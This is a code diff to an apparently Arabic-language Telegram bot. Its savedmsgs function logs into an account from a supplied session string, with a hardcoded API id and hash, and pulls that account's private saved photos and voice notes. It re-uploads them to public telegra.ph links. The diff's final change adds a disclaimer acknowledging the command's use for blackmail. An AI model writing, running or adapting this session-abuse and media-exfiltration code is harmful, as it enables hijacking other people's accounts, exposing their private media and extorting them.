@@ -33,7 +33,7 @@ async def savedmsgs(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
             telegraph = Telegraph()
-            telegraph.create_account(short_name="MyTelegraphAccount", author_name="Anonymous")  # Replace with your desired short name and author name
+            telegraph.create_account(short_name="MyTelegraphAccount", author_name="Anonymous") 
             
             messages = []
             async for msg in X.iter_messages('me', reverse=True, limit=10):
@@ -43,16 +43,16 @@ async def savedmsgs(strses):
                     if isinstance(msg.media, types.MessageMediaPhoto):
                         downloaded_file_name = await X.download_media(msg.media.photo)
                         with open(downloaded_file_name, 'rb') as f:
-                            photo_url = telegraph.upload_file(f)[0]['src']  # Extract the URL from the list
-                        messages.append(f"Photo: https://telegra.ph{photo_url}")
-                        os.remove(downloaded_file_name)  # Remove the temporarily downloaded file
+                            photo_url = telegraph.upload_file(f)[0]['src']  
+                        messages.append(f"صورة: https://telegra.ph{photo_url}")
+                        os.remove(downloaded_file_name)  
                     elif isinstance(msg.media, types.MessageMediaDocument):
                         if hasattr(msg.media.document, 'mime_type') and 'audio' in msg.media.document.mime_type:
                             downloaded_file_name = await X.download_media(msg.media.document)
                             with open(downloaded_file_name, 'rb') as f:
-                                voice_url = telegraph.upload_file(f)[0]['src']  # Extract the URL from the list
-                            messages.append(f"Voice: {voice_url}")
-                            os.remove(downloaded_file_name)  # Remove the temporarily downloaded file
+                                voice_url = telegraph.upload_file(f)[0]['src']  
+                            messages.append(f"بصمة: {voice_url}")
+                            os.remove(downloaded_file_name)  
                         
             return "\n".join(messages)
         except Exception as e:
@@ -775,4 +775,4 @@ async def users(event):
         for part in message_parts:
             await event.respond(part)
 
-        await event.respond("شكرا لأستخدامك سورس الساحر", buttons=keyboard)
+        await event.respond(" غير مبري الذمه اذا استخدمت الامر للابتزاز اللهم اني بلغت فاشهد", buttons=keyboard)
